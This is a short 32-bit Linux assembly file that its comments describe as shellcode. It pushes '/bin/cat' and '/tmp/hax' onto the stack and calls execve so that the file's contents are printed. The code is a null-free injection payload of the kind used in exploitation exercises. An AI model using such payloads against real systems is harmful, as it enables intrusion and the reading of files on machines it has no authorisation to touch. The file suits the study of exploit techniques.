BITS 32
    ;; /bin/cat shellcode for 32-bit linux. 

    ;; execve(const char *filename, char *const argv[], char *const envp[])
    ;;   0x0b            */bin/cat, [*/bin/cat, *PATH],              *NULL)
    ;;    eax,                 ebx,                ecx,                edx

    ;; "/bin/cat" on stack
    xor eax, eax    ; eax = NULL
    push eax        ; terminate string
    push 0x7461632f ; push "/cat"
    push 0x6e69622f ; push "/bin"
    mov ebx, esp    ; ebx -> controlled stack

    ;; edx -> path of target file - /tmp/hax
    push eax        ; terminate string
    push 0x7861682f
    push 0x706d742f
    mov edx, esp    ; edx -> PATH

    push eax        ; terminate argv[]
    push edx        ; push &PATH
    push ebx        ; push &/bin/cat
    mov ecx, esp    ; ecx -> argv

    push eax        ; terminate envp[]
    mov edx, esp    ; edx -> envp

    ;; perform execve syscall
    mov al, 0x0b
    int 0x80